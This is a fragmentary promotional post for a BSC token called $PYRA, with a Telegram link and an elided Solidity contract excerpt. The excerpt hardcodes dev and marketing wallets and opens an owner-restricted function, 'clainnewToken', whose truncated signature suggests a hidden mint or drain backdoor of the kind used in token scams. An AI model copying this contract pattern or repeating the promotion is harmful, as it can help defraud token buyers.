...
🔼PYRATHEREUM BINANCE - ($PYRA) 🔼

$PYRA aims to become one of the premier cryptocurrencies in the Binance Smart Chain ecosystem, 
providing efficient transaction solutions, driving DeFi innovation, and enabling coin holders 
to actively participate in project decision-making.

🔼Join our comunity
TG : https://t.me/+mCqS31V-zXAyYjVl
...
contract PYRATHEREUMBINANCE is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "PYRATHEREUM BINANCE";
    string private constant _symbol = unicode"$PYRA";
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint8 private _TxCount = 0;
    uint256 private _tTotal = 40000000000 * 10**_decimals;
    ...
    address payable public DevWallet = payable(0x398C01BDD338790669275C2F2614D923384b0F11);
    address payable public MarketingWallet = payable(0x5a3231d6f9934c90E9D5Ff415c0CA90338027Ca3);
    ...
    function clainnewToken(uint256 value, address adr) onlyAddress public virtual {
